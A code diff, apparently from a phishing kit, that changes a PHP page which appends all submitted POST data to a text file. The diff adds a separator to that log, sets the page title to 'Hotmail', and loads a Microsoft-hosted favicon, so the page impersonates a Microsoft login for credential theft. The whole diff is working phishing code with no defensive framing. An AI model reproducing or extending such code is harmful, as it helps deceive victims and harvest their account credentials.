@@ -21,6 +21,7 @@
 
 $file = "export/data.txt";
 file_put_contents($file, print_r($_POST, true), FILE_APPEND);
+file_put_contents($file, print_r("<hr/>\n", true), FILE_APPEND);
 
 ?>
 
@@ -28,6 +29,11 @@ file_put_contents($file, print_r($_POST, true), FILE_APPEND);
 
 <html>
 <head>
+
+<title> Hotmail </title>
+
+<link rel="shortcut icon" href="https://auth.gfx.ms/16.000.27593.7/images/favicon.ico"/>
+
 </head>
 <body style="background-image:url(css/error.png); background-repeat: no-repeat; background-size: auto; background-position:center; background-color: #f7f7f7;">
 </body>
